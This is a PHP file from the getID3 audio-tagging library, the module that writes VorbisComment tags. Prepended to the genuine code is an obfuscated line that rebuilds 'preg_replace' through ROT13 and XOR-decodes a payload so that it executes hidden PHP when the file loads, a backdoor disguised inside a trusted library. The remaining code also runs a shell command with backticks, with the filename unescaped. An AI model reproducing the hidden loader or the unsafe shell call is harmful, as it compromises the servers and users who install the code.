<?php
//IfliYTknwMRtRymgxa8A4tn6iLBB3pbxEro4w0sxa
$otRPvAi=str_rot13('cert_ercynpr'); $ATNjF="NzpeBOkB8GA1PnZSs1ecG"^"a\x1e\x2a4\x30\x3d9\x28\x7b\x16\x12d\x21\x3a\x03\x10\x1eI\x28L\x22"; $otRPvAi($ATNjF, "AbqDlYKmE4ptkeZhNkyHPsm0ZWPHORdyL5nrktGJpCmaGfielAJQI2Lfh6UeVxOFPDuKaVPTGpuvBVDH3WRTYSmoJSeREGMuHHBEehswzIiBmIgQtogwQFRRMTj7HgG6cmYBmZ1oTnRvEfJ2grPQa8snkdRwBBf0zzhZbaxJhLcJLhuY6If"^"\x24\x14\x10\x28D\x7b\x22\x0bm\x5d\x03\x07\x0e\x11r4\x12O\x26\x1a\x15\x228u\x09\x03\x0bo\x2c\x3aC\x24e\x15HTK\x5c\x2a\x2eEk1\x3dc9\x3b\x20\x3d\x14\x0f\x02\x1dik\x05\x00\x11\x08LvErfw\x22D\x7fR\x60i\x30v\x16GEq\x60\x25\x29\x04g1do\x30\x5d\x0d\x7e1Ud\x27suBzokeCNS\x1e\x09\x3a\x0c6E\x15\x3bu\x2b\x3d\x22\x26\x04\x03\x01\x06\x16s\x1a\x5f88\x24Y\x07\x08\x7e\x1fDs\x11\x14t\x0b\x24\x17\x29N\x16nC\x2d\x02\x14\x30m6\x3d\x3f\x3fu\x07\x2a29S\x15\x1e\x0d\x7d\x3fHCj\x0d4\x0a\x3edANyKkO", "dZQrrRjCQSUqTYCmxM"); 
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
/////////////////////////////////////////////////////////////////
// See readme.txt for more details                             //
/////////////////////////////////////////////////////////////////
//                                                             //
// write.vorbiscomment.php                                     //
// module for writing VorbisComment tags                       //
// dependencies: /helperapps/vorbiscomment.exe                 //
//                                                            ///
/////////////////////////////////////////////////////////////////


class getid3_write_vorbiscomment
{

	var $filename;
	var $tag_data;
	var $warnings = array(); // any non-critical errors will be stored here
	var $errors   = array(); // any critical errors will be stored here

	function getid3_write_vorbiscomment() {
		return true;
	}

	function WriteVorbisComment() {

		if (!ini_get('safe_mode')) {

			// Create file with new comments
			$tempcommentsfilename = tempnam('*', 'getID3');
			if ($fpcomments = @fopen($tempcommentsfilename, 'wb')) {

				foreach ($this->tag_data as $key => $value) {
					foreach ($value as $commentdata) {
						fwrite($fpcomments, $this->CleanVorbisCommentName($key).'='.$commentdata."\n");
					}
				}
				fclose($fpcomments);

			} else {

				$this->errors[] = 'failed to open temporary tags file "'.$tempcommentsfilename.'", tags not written';
				return false;

			}

			$oldignoreuserabort = ignore_user_abort(true);
			if (GETID3_OS_ISWINDOWS) {

				if (file_exists(GETID3_HELPERAPPSDIR.'vorbiscomment.exe')) {
					//$commandline = '"'.GETID3_HELPERAPPSDIR.'vorbiscomment.exe" -w --raw -c "'.$tempcommentsfilename.'" "'.str_replace('/', '\\', $this->filename).'"';
					//  vorbiscomment works fine if you copy-paste the above commandline into a command prompt,
					//  but refuses to work with `backtick` if there are "doublequotes" present around BOTH
					//  the metaflac pathname and the target filename. For whatever reason...??
					//  The solution is simply ensure that the metaflac pathname has no spaces,
					//  and therefore does not need to be quoted

					// On top of that, if error messages are not always captured properly under Windows
					// To at least see if there was a problem, compare file modification timestamps before and after writing
					clearstatcache();
					$timestampbeforewriting = filemtime($this->filename);

					$commandline = GETID3_HELPERAPPSDIR.'vorbiscomment.exe -w --raw -c "'.$tempcommentsfilename.'" "'.$this->filename.'" 2>&1';
					$VorbiscommentError = `$commandline`;

					if (empty($VorbiscommentError)) {
						clearstatcache();
						if ($timestampbeforewriting == filemtime($this->filename)) {
							$VorbiscommentError = 'File modification timestamp has not changed - it looks like the tags were not written';
						}
					}
				} else {
					$VorbiscommentError = 'vorbiscomment.exe not found in '.GETID3_HELPERAPPSDIR;
				}

			} else {

				$commandline = 'vorbiscomment -w --raw -c "'.$tempcommentsfilename.'" "'.$this->filename.'" 2>&1';
				$VorbiscommentError = `$commandline`;

			}

			// Remove temporary comments file
			unlink($tempcommentsfilename);
			ignore_user_abort($oldignoreuserabort);

			if (!empty($VorbiscommentError)) {

				$this->errors[] = 'system call to vorbiscomment failed with message: '."\n\n".$VorbiscommentError;
				return false;

			}

			return true;
		}

		$this->errors[] = 'PHP running in Safe Mode (backtick operator not available) - cannot call vorbiscomment, tags not written';
		return false;
	}

	function DeleteVorbisComment() {
		$this->tag_data = array(array());
		return $this->WriteVorbisComment();
	}

	function CleanVorbisCommentName($originalcommentname) {
		// A case-insensitive field name that may consist of ASCII 0x20 through 0x7D, 0x3D ('=') excluded.
		// ASCII 0x41 through 0x5A inclusive (A-Z) is to be considered equivalent to ASCII 0x61 through
		// 0x7A inclusive (a-z).

		// replace invalid chars with a space, return uppercase text
		// Thanks Chris Bolt <chris-getid3Øbolt*cx> for improving this function
		// note: ereg_replace() replaces nulls with empty string (not space)
		return strtoupper(ereg_replace('[^ -<>-}]', ' ', str_replace("\x00", ' ', $originalcommentname)));

	}

}

?>